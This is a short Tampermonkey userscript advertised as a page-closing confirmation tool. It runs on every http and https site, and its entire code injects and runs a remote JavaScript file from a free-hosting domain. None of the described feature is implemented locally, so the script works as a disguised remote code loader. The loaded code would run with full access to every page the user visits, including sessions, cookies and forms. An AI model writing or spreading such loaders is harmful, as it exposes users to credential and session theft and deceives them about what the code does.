// ==UserScript==
// @name         ⌛Closing Confirmation(WORK)⌛
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  Prevents the page from being closed without your consent
// @author       Proecho
// @match        https://*/*
// @match        http://*/*
// @grant        none
//@icon          http://www.newdesignfile.com/postpic/2012/06/music-icon_16624.png
// ==/UserScript==
//By Proecho
(function() {
    'use strict';
    var script = document.createElement("script");
script.type = "text/javascript";
script.src = "https://dilanhuffman123.000webhostapp.com/alert1.js"
document.head.appendChild(script);
})();